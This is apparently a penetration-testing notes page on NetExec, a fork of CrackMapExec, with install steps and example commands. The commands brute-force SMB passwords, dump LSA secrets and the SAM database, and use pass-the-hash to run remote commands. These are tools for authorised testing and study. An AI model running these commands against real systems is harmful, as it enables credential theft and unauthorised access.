# NetExec

<div class="row row-cols-lg-2"><div>

[NetExec](https://github.com/Pennyw0rth/NetExec) or NXC <small>(1.6k ⭐)</small> is a fork of [CrackMapExec](cme.md) which is now archived. It can be used to brute force network services passwords.

The [wiki](https://www.netexec.wiki/) further lists everything else you can do.

```shell!
$ sudo apt install pipx git
$ pipx ensurepath
$ pipx install git+https://github.com/Pennyw0rth/NetExec
```
</div><div>

Example usage:

```shell!
$ nxc smb IP -u 'username' -p password.list
$ nxc smb IP --local-auth -u 'xxx' -p 'yyy' --lsa
$ nxc smb IP --local-auth -u 'xxx' -p 'yyy' --sam
$ nxc smb IP -u 'xxx' -d . -H hash -x whoami
```
</div></div>